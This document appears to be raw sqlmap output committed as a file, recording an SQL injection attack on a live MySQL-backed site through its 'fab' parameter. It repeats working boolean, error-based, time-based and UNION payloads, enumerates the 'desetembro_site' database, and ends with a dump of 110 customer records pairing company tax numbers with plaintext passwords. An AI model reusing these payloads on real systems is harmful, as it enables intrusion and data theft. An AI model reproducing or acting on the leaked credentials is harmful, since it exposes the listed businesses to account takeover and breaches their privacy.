@@ -1,0 +1,340 @@
+sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:
+---
+Parameter: fab (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: fab=91 AND 5972=5972
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: fab=91 AND (SELECT 7776 FROM(SELECT COUNT(*),CONCAT(0x71706b7a71,(SELECT (ELT(7776=7776,1))),0x716b716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: fab=91 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: fab=91 UNION ALL SELECT CONCAT(0x71706b7a71,0x576a766273524858595869635a4a66764b687447526f75555a7765687a61644259666c497061647a,0x716b716a71),NULL,NULL,NULL,NULL,NULL-- Ajlu
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] desetembro_site
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: fab (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: fab=91 AND 5972=5972
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: fab=91 AND (SELECT 7776 FROM(SELECT COUNT(*),CONCAT(0x71706b7a71,(SELECT (ELT(7776=7776,1))),0x716b716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: fab=91 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: fab=91 UNION ALL SELECT CONCAT(0x71706b7a71,0x576a766273524858595869635a4a66764b687447526f75555a7765687a61644259666c497061647a,0x716b716a71),NULL,NULL,NULL,NULL,NULL-- Ajlu
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: desetembro_site
+[9 tables]
++---------------+
+| adm           |
+| categorias    |
+| clientes      |
+| fabricantes   |
+| pedidos       |
+| produtos      |
+| subcategorias |
+| veiculos      |
+| vendedores    |
++---------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: fab (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: fab=91 AND 5972=5972
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: fab=91 AND (SELECT 7776 FROM(SELECT COUNT(*),CONCAT(0x71706b7a71,(SELECT (ELT(7776=7776,1))),0x716b716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: fab=91 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: fab=91 UNION ALL SELECT CONCAT(0x71706b7a71,0x576a766273524858595869635a4a66764b687447526f75555a7765687a61644259666c497061647a,0x716b716a71),NULL,NULL,NULL,NULL,NULL-- Ajlu
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: desetembro_site
+[9 tables]
++---------------+
+| adm           |
+| categorias    |
+| clientes      |
+| fabricantes   |
+| pedidos       |
+| produtos      |
+| subcategorias |
+| veiculos      |
+| vendedores    |
++---------------+
+
+Database: desetembro_site
+Table: categorias
+[1 column]
++--------------+-----------+
+| Column       | Type      |
++--------------+-----------+
+| dataCadastro | timestamp |
++--------------+-----------+
+
+Database: desetembro_site
+Table: veiculos
+[1 column]
++--------------+-----------+
+| Column       | Type      |
++--------------+-----------+
+| dataCadastro | timestamp |
++--------------+-----------+
+
+Database: desetembro_site
+Table: vendedores
+[1 column]
++--------------+-----------+
+| Column       | Type      |
++--------------+-----------+
+| dataCadastro | timestamp |
++--------------+-----------+
+
+Database: desetembro_site
+Table: fabricantes
+[1 column]
++--------------+-----------+
+| Column       | Type      |
++--------------+-----------+
+| dataCadastro | timestamp |
++--------------+-----------+
+
+Database: desetembro_site
+Table: subcategorias
+[1 column]
++--------------+-----------+
+| Column       | Type      |
++--------------+-----------+
+| dataCadastro | timestamp |
++--------------+-----------+
+
+Database: desetembro_site
+Table: clientes
+[3 columns]
++-----------------+-----------+
+| Column          | Type      |
++-----------------+-----------+
+| dataCadastro    | timestamp |
+| desconto        | double    |
+| descontoproduto | double    |
++-----------------+-----------+
+
+Database: desetembro_site
+Table: produtos
+[6 columns]
++--------------+-----------+
+| Column       | Type      |
++--------------+-----------+
+| dataCadastro | timestamp |
+| descricao    | text      |
+| preco        | float     |
+| promocao     | float     |
+| similares    | text      |
+| veiculos     | text      |
++--------------+-----------+
+
+Database: desetembro_site
+Table: adm
+[1 column]
++--------------+-----------+
+| Column       | Type      |
++--------------+-----------+
+| dataCadastro | timestamp |
++--------------+-----------+
+
+Database: desetembro_site
+Table: pedidos
+[3 columns]
++--------------+-----------+
+| Column       | Type      |
++--------------+-----------+
+| dataCadastro | timestamp |
+| observacao   | text      |
+| produtos     | text      |
++--------------+-----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: fab (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: fab=91 AND 5972=5972
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: fab=91 AND (SELECT 7776 FROM(SELECT COUNT(*),CONCAT(0x71706b7a71,(SELECT (ELT(7776=7776,1))),0x716b716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: fab=91 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: fab=91 UNION ALL SELECT CONCAT(0x71706b7a71,0x576a766273524858595869635a4a66764b687447526f75555a7765687a61644259666c497061647a,0x716b716a71),NULL,NULL,NULL,NULL,NULL-- Ajlu
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: desetembro_site
+Table: clientes
+[110 entries]
++------------------+--------------------+
+| cnpj             | senha              |
++------------------+--------------------+
+| 08602771000160   | ma566705           |
+| 16983554000196   | helber123          |
+| 15628278000185   | 0706197m           |
+| 02012944000104   | 268451397          |
+| 32276248000176   | 9955               |
+| 111111111111     | jh9nzijz           |
+| 35774611000414   | top1000            |
+| 29705430000190   | 123456             |
+| 12504766000192   | 88793230           |
+| 12504766000192   | 88793230           |
+| 113522090        | JURUPINGA22        |
+| 11398410000159   | center             |
+| 05753012000100   | autopecas          |
+| 29657837000190   | 12127537           |
+| 20709589000109   | leandro12rj        |
+| 18049483000184   | mk1282             |
+| 21068772000135   | JACARE             |
+| 26080810000199   | 33715150           |
+| 28963659000162   | 86928692           |
+| 29284562000196   | 16072017lm         |
+| 28235398000164   | reiouro1419        |
+| 01566922000123   | 001964             |
+| 03042152000145   | pneus56            |
+| 29250200000184   | 12243648           |
+| 28776193000141   | switchback         |
+| 29105679000165   | pimenta28          |
+| 31395585000110   | larissa99          |
+| 22870192000120   | 511048150184       |
+| 10404725000107   | pegador1           |
+| 22885744000173   | vitinhosgamato123  |
+| 14852785000135   | Rodrigo7896        |
+| 12297690000171   | mei2018RIO         |
+| 11454032000183   | vectra97           |
+| 27804526000180   | 28102010           |
+| 29625552000177   | 1234               |
+| 13465198000120   | 1425yg             |
+| 07606451000116   | ab132094           |
+| 29076970000152   | csa10021972        |
+| 28258036000199   | cb220              |
+| 1234568956       | jh9nzijz           |
+| 24293572000174   | SERVICE03          |
+| 20499243000123   | DUpneus10          |
+| 23671150000122   | 642800             |
+| 28121289000116   | Jabspg1411         |
+| 18467286000185   | 37630984           |
+| 29195448000190   | Penetra2018        |
+| 19586419000103   | Penetra2018        |
+| 19586419000103   | penetra2018        |
+| 22893987000153   | 37090775           |
+| 29559443000107   | 281013             |
+| 02846182000141   | angelo127983       |
+| 33619578000180   | 04oficina          |
+| 02239843000170   | 24817547           |
+| 30975076000101   | 20069100           |
+| 42244285000156   | grupoimperio       |
+| 01516712000120   | samsung            |
+| 12040735000128   | jeanautoeletrica40 |
+| 30850766000126   | joaopeter051013    |
+| 29533835000199   | lucca12            |
+| 29218926000130   | 220505             |
+| 29218926000130   | 220505             |
+| 39890280000196   | 26947576           |
+| 25450684000154   | 082006             |
+| 21737826000108   | 40433x17           |
+| 0933494000110    | 4900155            |
+| 29546924000170   | 90541              |
+| 01305825000187   | EMILIO44           |
+| 24195904000188   | 280618             |
+| 08871917000173   | sAMSUNG9002        |
+| 31397057000108   | 414243             |
+| 29729783000141   | teco220170         |
+| 228527730000139  | 260213             |
+| 17148085000152   | 100tempo           |
+| 30431932000150   | rf252525           |
+| 10243763000117   | 18571857           |
+| 19803417000110   | 202526             |
+| 31777468000110   | matheus88584594    |
+| 31513952000132   | neiva0980          |
+| 10720302000198   | novocar2018        |
+| 12253855000103   | jg232302           |
+| 26482139000102   | scudi2016          |
+| 28138472000124   | alg321             |
+| 09473210000171   | 157478             |
+| 27585803000105   | ru65ca08           |
+| 30162728000180   | pulsar01           |
+| 06034577462      | 38xrevolver        |
+| 22910316000153   | jesus1901          |
+| 32276248000176   | 9955               |
+| 73882680000198   | tidinho            |
+| 07495134000170   | sp6938             |
+| 3104725100155    | 01478520           |
+| 09420350000181   | 200798             |
+| 07473626000164   | 10203040           |
+| 07473626000164   | 10204024061991     |
+| 2163159170000251 | mesquita           |
+| 17412014000115   | 2145               |
+| 13454262000178   | 981374             |
+| 28586357000112   | 879607             |
+| 12136308000148   | 1212vida           |
+| 30889902000191   | valentim2017       |
+| 14672972000137   | 30111964           |
+| 20199392000177   | 100677             |
+| 174120141000115  | val2145            |
+| 30166703000155   | 7084164            |
+| 61178927000100   | return79           |
+| 10827169000173   | r13autopecas       |
+| 18129063744      | eternamente        |
+| 24061839000106   | Br11132627         |
+| 32788114000134   | davi1088           |
+| 42247064000131   | bikebike           |
++------------------+--------------------+
+
